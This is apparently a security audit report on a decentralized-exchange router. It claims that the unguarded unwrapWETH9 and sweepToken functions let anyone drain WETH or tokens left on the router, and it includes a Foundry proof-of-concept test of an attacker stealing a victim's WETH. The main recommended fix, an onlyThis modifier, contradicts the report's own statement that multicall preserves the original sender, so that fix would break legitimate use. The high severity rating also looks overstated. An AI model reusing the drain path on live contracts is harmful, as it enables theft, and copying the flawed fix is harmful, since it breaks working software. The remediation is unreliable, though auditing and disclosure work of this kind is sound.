Audit Report

## Title
Unguarded `unwrapWETH9` and `sweepToken` allow any caller to drain router WETH/token balances to an arbitrary address — (`metric-periphery/contracts/base/PeripheryPayments.sol`)

## Summary

`unwrapWETH9` and `sweepToken` are `public payable` with no access control and accept a fully caller-controlled `recipient`. Any address can call either function at any time and redirect the router's entire WETH or ERC-20 balance to an arbitrary destination. The intended atomic `multicall` pattern is not enforced, leaving a theft window whenever tokens land on the router between transactions.

## Finding Description

`unwrapWETH9` reads the router's full WETH balance and transfers it as ETH to the caller-supplied `recipient` with no check on `msg.sender`: [1](#0-0) 

`sweepToken` has the identical pattern for arbitrary ERC-20 tokens: [2](#0-1) 

`multicall` uses `Address.functionDelegateCall`, so sub-calls execute in the router's storage context with the original `msg.sender` preserved — the correct Uniswap v3 pattern — but nothing prevents calling `unwrapWETH9` or `sweepToken` directly outside of `multicall`: [3](#0-2) 

`exactInputSingle` is `external payable` and can be called as a standalone transaction with `recipient=address(router)`, depositing WETH on the router: [4](#0-3) 

The test suite confirms the intended atomic pattern (swap → `unwrapWETH9` in one `multicall`), but also directly demonstrates the unguarded call surface — `test_unwrapWETH9_sendsEthToRecipient` calls `router.unwrapWETH9(amount, recipient)` with no access restriction, sending funds to a third-party `recipient` from an unrelated caller: [5](#0-4) 

No existing guard prevents an attacker from supplying `amountMinimum=0` and `recipient=attacker` to drain whatever balance is present.

## Impact Explanation

Direct theft of user ETH/token principal. A victim who calls `exactInputSingle(tokenOut=WETH, recipient=address(router))` as a standalone transaction leaves WETH on the router. An attacker (or MEV bot) calls `unwrapWETH9(0, attacker)` before the victim's follow-up call, receiving the full ETH amount. The victim's subsequent `unwrapWETH9` silently succeeds with zero balance, providing no on-chain indication of theft. The same path applies to any ERC-20 output token via `sweepToken`. This is a direct, repeatable loss of user principal with no special privileges required — **High severity**.

## Likelihood Explanation

The two-transaction pattern (swap then unwrap) is natural for users unaware of the `multicall` requirement. MEV bots routinely monitor mempools for profitable drain opportunities on routers. No malicious pool, non-standard token, or privileged role is required — only a public call to a public function. The attack is repeatable on every such standalone swap.

## Recommendation

Add a `msg.sender == recipient` guard to both functions, or restrict them to the `multicall` delegatecall path via an `onlyThis` modifier:

```solidity
modifier onlyThis() {
    require(msg.sender == address(this), "only via multicall");
    _;
}

function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override onlyThis {
    ...
}

function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override onlyThis {
    ...
}
```

Alternatively, the simpler caller-equals-recipient guard:

```solidity
require(msg.sender == recipient, "caller must be recipient");
```

## Proof of Concept

```solidity
function test_attacker_steals_victim_weth() public {
    uint128 amountIn = 3_000;

    // tx1: victim swaps token -> WETH, leaving WETH on router
    vm.prank(victim);
    router.exactInputSingle(IMetricOmmSimpleRouter.ExactInputSingleParams({
        pool: address(pool),
        tokenIn: address(token1),
        tokenOut: address(weth),
        zeroForOne: false,
        amountIn: amountIn,
        amountOutMinimum: 0,
        recipient: address(router),   // WETH lands on router
        deadline: block.timestamp + 1,
        priceLimitX64: type(uint128).max,
        extensionData: ""
    }));

    uint256 routerWeth = weth.balanceOf(address(router));
    assertGt(routerWeth, 0, "weth on router");

    // tx2: attacker drains it — no access control on unwrapWETH9
    uint256 attackerEthBefore = attacker.balance;
    vm.prank(attacker);
    router.unwrapWETH9(0, attacker);

    assertEq(weth.balanceOf(address(router)), 0, "router drained");
    assertEq(attacker.balance - attackerEthBefore, routerWeth, "attacker received victim ETH");
}
```

### Citations

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L37-45)
```text
  function unwrapWETH9(uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceWETH = IERC20(WETH).balanceOf(address(this));
    if (balanceWETH < amountMinimum) revert InsufficientWETH(amountMinimum, balanceWETH);

    if (balanceWETH > 0) {
      IWETH9(WETH).withdraw(balanceWETH);
      _transferETH(recipient, balanceWETH);
    }
  }
```

**File:** metric-periphery/contracts/base/PeripheryPayments.sol (L48-55)
```text
  function sweepToken(address token, uint256 amountMinimum, address recipient) public payable override {
    uint256 balanceToken = IERC20(token).balanceOf(address(this));
    if (balanceToken < amountMinimum) revert InsufficientToken(token, amountMinimum, balanceToken);

    if (balanceToken > 0) {
      IERC20(token).safeTransfer(recipient, balanceToken);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L39-44)
```text
  function multicall(bytes[] calldata data) public payable override returns (bytes[] memory results) {
    results = new bytes[](data.length);
    for (uint256 i = 0; i < data.length; i++) {
      results[i] = Address.functionDelegateCall(address(this), data[i]);
    }
  }
```

**File:** metric-periphery/contracts/MetricOmmSimpleRouter.sol (L67-86)
```text
  function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut) {
    _checkDeadline(params.deadline);
    uint128 priceLimitX64 = MetricOmmSwapPath.normalizePriceLimit(params.zeroForOne, params.priceLimitX64);

    _setNextCallbackContext(params.pool, CALLBACK_MODE_JUST_PAY, msg.sender, params.tokenIn);
    (int128 amount0Delta, int128 amount1Delta) = IMetricOmmPoolActions(params.pool)
      .swap(
        params.recipient,
        params.zeroForOne,
        MetricOmmSwapInputs.asAmountSpecifiedIn(params.amountIn),
        priceLimitX64,
        "",
        params.extensionData
      );
    int128 out = MetricOmmSwapResults.extractAmountOut(params.zeroForOne, amount0Delta, amount1Delta);
    amountOut = MetricOmmSwapInputs.int128ToUint128(out);
    if (amountOut < params.amountOutMinimum) revert InsufficientOutput(amountOut, params.amountOutMinimum);

    _clearExpectedCallbackPool();
  }
```

**File:** metric-periphery/test/MetricOmmSimpleRouter.payments.t.sol (L38-50)
```text
  function test_unwrapWETH9_sendsEthToRecipient() public {
    uint256 amount = 1 ether;
    weth.deposit{value: amount}();
    weth.transfer(address(router), amount);

    uint256 recipientBefore = recipient.balance;

    router.unwrapWETH9(amount, recipient);

    assertEq(weth.balanceOf(address(router)), 0, "router weth cleared");
    assertEq(recipient.balance - recipientBefore, amount, "recipient eth");
    assertEq(address(router).balance, 0, "router eth cleared");
  }
```
